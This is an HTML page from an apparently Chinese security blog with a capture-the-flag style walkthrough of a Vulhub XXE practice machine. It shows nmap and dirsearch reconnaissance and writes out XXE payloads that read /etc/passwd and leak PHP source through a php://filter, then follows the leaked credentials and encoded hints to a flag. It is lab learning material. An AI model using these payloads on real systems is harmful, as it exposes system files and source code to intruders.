@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>XXE-Vulhub渗透测试 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言Vulhub-XXE渗透练习 目标：获取靶机Flag 运行环境：kali2019.4&amp;&amp;XXE靶机&amp;&amp;VMware15.X 渗透测试靶机打开后长这样….  然后我们要做的第一件事就是去扫靶机的IP地址，看看靶机的地址是多少。 下图中，我们使用netdiscover直接找到这个靶机的IP地址为192.168.139.130  然后我们用nmap去扫描该靶机的IP，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE-Vulhub渗透测试">
+<meta property="og:url" content="http://yoursite.com/2020/01/02/XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言Vulhub-XXE渗透练习 目标：获取靶机Flag 运行环境：kali2019.4&amp;&amp;XXE靶机&amp;&amp;VMware15.X 渗透测试靶机打开后长这样….  然后我们要做的第一件事就是去扫靶机的IP地址，看看靶机的地址是多少。 下图中，我们使用netdiscover直接找到这个靶机的IP地址为192.168.139.130  然后我们用nmap去扫描该靶机的IP，">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//1.png">
+<meta property="og:image" content="http://yoursite.com/.com//2.png">
+<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="og:image" content="http://yoursite.com/.com//4.png">
+<meta property="og:image" content="http://yoursite.com/.com//5.png">
+<meta property="og:image" content="http://yoursite.com/.com//6.png">
+<meta property="og:image" content="http://yoursite.com/.com//7.png">
+<meta property="og:image" content="http://yoursite.com/.com//8.png">
+<meta property="og:image" content="http://yoursite.com/.com//9.png">
+<meta property="og:image" content="http://yoursite.com/.com//10.png">
+<meta property="og:image" content="http://yoursite.com/.com//12.png">
+<meta property="og:image" content="http://yoursite.com/.com//11.png">
+<meta property="og:image" content="http://yoursite.com/.com//13.png">
+<meta property="og:image" content="http://yoursite.com/.com//14.png">
+<meta property="og:image" content="http://yoursite.com/.com//15.png">
+<meta property="og:image" content="http://yoursite.com/.com//16.png">
+<meta property="og:image" content="http://yoursite.com/.com//17.png">
+<meta property="og:image" content="http://yoursite.com/.com//XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5C18.png">
+<meta property="article:published_time" content="2020-01-02T15:30:44.000Z">
+<meta property="article:modified_time" content="2020-01-05T18:50:12.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-XXE-Vulhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/01/02/XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
+  <time datetime="2020-01-02T15:30:44.000Z" itemprop="datePublished">2020-01-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XXE-Vulhub渗透测试
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Vulhub-XXE渗透练习</p>
+<p>目标：获取靶机Flag</p>
+<p>运行环境：kali2019.4&amp;&amp;XXE靶机&amp;&amp;VMware15.X</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>靶机打开后长这样….</p>
+<p><img src="/.com//1.png" alt="image-20200102110918810"></p>
+<p>然后我们要做的第一件事就是去扫靶机的IP地址，看看靶机的地址是多少。</p>
+<p>下图中，我们使用<strong>netdiscover</strong>直接找到这个靶机的IP地址为<strong>192.168.139.130</strong></p>
+<p><img src="/.com//2.png" alt="image-20200102111233017"></p>
+<p>然后我们用nmap去扫描该靶机的IP，看看它有什么端口是开着的。</p>
+<p>命令如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v -p <span class="number">1</span><span class="number">-65535</span> <span class="number">192.168</span><span class="number">.139</span><span class="number">.130</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//3.png" alt="image-20200102170442262"></p>
+<p>如上图所示，靶机的80端口和5355端口是开放的。然后我们访问80端口。</p>
+<p><img src="/.com//4.png" alt="image-20200102173102954"></p>
+<p>这是一个ubuntu的页面，没有值得利用的东西，我们扫描该站点目录。</p>
+<p>使用dirsearch扫描该站点，发现robots.txt</p>
+<p><img src="/.com//5.png" alt="image-20200102194359097"></p>
+<p>访问robots.txt</p>
+<p><img src="/.com//6.png" alt="image-20200102194454369"></p>
+<p>访问admin.php无果，所以我们访问/xxe/</p>
+<p><img src="/.com//7.png" alt="image-20200102194552349"></p>
+<p>这个靶机的考察点在于xxe,所以我们就直接使用xxe的payload试试能不能弹出些东西来</p>
+<p>payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.8" encoding="UTF-8"?&gt;</span>         </span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//8.png" alt="image-20200102195855558"></p>
+<p>用这个思路去获得刚才获取不到的admin.php,payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.8&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;         </span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY&gt;</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;admin.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//9.png" alt="image-20200102200431782"></p>
+<p>base64解码后,获得php源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$msg = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>] == <span class="string">'administhebest'</span> &amp;&amp; md5($_POST[<span class="string">'password'</span>]) == <span class="string">'e6e061838856bf47e1de730719fb2609'</span>) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'valid'</span>] = <span class="keyword">true</span>;</span><br><span class="line">        $_SESSION[<span class="string">'timeout'</span>] = time();</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = <span class="string">'administhebest'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You have entered valid use name and password &lt;br /&gt;"</span>;</span><br><span class="line">        $flag = <span class="string">"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'&gt;Flag&lt;/a&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">'Maybe Later'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行MD5解密</p>
+<p><img src="/.com//10.png" alt="image-20200102201331103"></p>
+<p>但是这个并不管用….</p>
+<p><img src="/.com//12.png" alt="image-20200102202244390"></p>
+<p>扫描/xxe的目录</p>
+<p><img src="/.com//11.png" alt="image-20200102201331103"></p>
+<p>访问这个admin.php，然后填入用户名和密码，跳出一个红色的flag,访问试试，当时访问是500.所以用一样的xxe套路访问flagtimeout.php</p>
+<p><img src="/.com//13.png" alt="image-20200102203011458"></p>
+<p>解码获得：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"&lt;!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) --&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>base32解码：</p>
+<p><img src="/.com//14.png" alt="image-20200102203352059"></p>
+<p>访问/ect/.flag.php</p>
+<p><img src="/.com//15.png" alt="image-20200102203645462"></p>
+<p>解码的结果如下：</p>
+<p><img src="/.com//16.png" alt="image-20200102204232861"></p>
+<p>这是一个webshell</p>
+<p><img src="/.com//17.png" alt="image-20200102204750004"></p>
+<p>获得flag</p>
+<p><img src="/.com//XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5C18.png" alt="image-20200102210328465"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/02/XXE-Vulhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5jf000qkou5b391fxe7" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/01/09/%E6%9F%90JA%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          某JA模块注入漏洞分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/12/28/maccms8%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">maccms8前台sql注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
